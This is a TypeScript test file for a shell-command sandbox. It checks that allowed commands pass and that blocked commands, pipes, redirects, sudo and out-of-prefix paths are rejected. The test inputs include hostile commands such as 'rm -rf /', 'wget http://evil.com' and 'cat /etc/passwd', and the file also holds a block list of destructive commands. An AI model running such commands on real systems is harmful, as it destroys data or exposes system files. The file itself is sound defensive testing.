/**
 * Tests for ShellSandbox (shell command sandboxing)
 */

import { describe, it, beforeEach } from 'node:test';
import { equal, ok } from 'node:assert';
import { ShellSandbox } from '../../src/security/sandbox.js';
import type { SandboxConfig } from '../../src/security/types.js';

const defaultConfig: SandboxConfig = {
  allowedCommands: ['ls', 'cat', 'echo', 'grep', 'find', 'pwd', 'whoami'],
  blockedCommands: ['rm', 'sudo', 'chmod', 'chown', 'kill', 'shutdown', 'reboot'],
  maxExecutionTimeMs: 5000,
  allowPipes: false,
  allowRedirects: false,
  allowBackground: false,
  allowSudo: false,
  maxArgs: 10,
  validatePaths: true,
  allowedPathPrefixes: ['/tmp', '/home'],
};

describe('ShellSandbox', () => {
  let sandbox: ShellSandbox;

  beforeEach(() => {
    sandbox = new ShellSandbox(defaultConfig);
  });

  describe('validate', () => {
    it('allows whitelisted commands', () => {
      const result = sandbox.validate('ls -la /tmp');
      ok(result.allowed, 'ls command allowed');
    });

    it('blocks blacklisted commands', () => {
      const result = sandbox.validate('rm -rf /');
      ok(!result.allowed, 'rm command blocked');
      ok(result.reason, 'reason provided');
    });

    it('blocks commands not in whitelist', () => {
      const result = sandbox.validate('wget http://evil.com');
      ok(!result.allowed, 'wget command blocked');
    });

    it('blocks pipes when disabled', () => {
      const result = sandbox.validate('ls | grep test');
      ok(!result.allowed, 'pipes blocked');
    });

    it('blocks redirects when disabled', () => {
      const result = sandbox.validate('echo hello > /tmp/test');
      ok(!result.allowed, 'redirects blocked');
    });

    it('blocks background processes', () => {
      const result = sandbox.validate('sleep 100 &');
      ok(!result.allowed, 'background processes blocked');
    });

    it('blocks sudo', () => {
      const result = sandbox.validate('sudo ls');
      ok(!result.allowed, 'sudo blocked');
    });

    it('validates file paths', () => {
      const result = sandbox.validate('cat /etc/passwd');
      ok(!result.allowed, 'path outside allowed prefixes blocked');
    });

    it('allows paths within allowed prefixes', () => {
      const result = sandbox.validate('cat /tmp/test.txt');
      ok(result.allowed, 'path within allowed prefix allowed');
    });

    it('limits number of arguments', () => {
      const result = sandbox.validate('echo a b c d e f g h i j k');
      ok(!result.allowed, 'too many arguments blocked');
    });
  });

  describe('sanitizeCommand', () => {
    it('returns sanitized command when allowed', () => {
      const result = sandbox.validate('ls /tmp');
      ok(result.sanitizedCommand, 'sanitized command provided');
    });

    it('returns undefined when blocked', () => {
      const result = sandbox.validate('rm -rf /');
      equal(result.sanitizedCommand, undefined, 'no sanitized command for blocked');
    });
  });
});
